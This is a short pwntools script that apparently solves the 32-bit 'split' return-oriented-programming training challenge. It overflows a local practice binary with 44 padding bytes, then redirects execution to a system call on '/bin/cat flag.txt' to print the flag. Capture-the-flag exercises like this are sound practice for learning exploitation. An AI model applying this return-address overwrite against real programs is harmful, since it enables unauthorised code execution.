from pwn import *

e = ELF('./split32')
p = e.process()

print(p.recv().decode())

# padding to overwrite return pointer
padding = b'A' * 44

# address of instruction calling system in usefulFunction
ret = p32(0x8048657)

# address of "/bin/cat flag.txt"
cat = p32(0x0804a030)

payload = padding + ret + cat
p.sendline(payload)

flag = p.recvline().decode()
success(flag)

p.close()
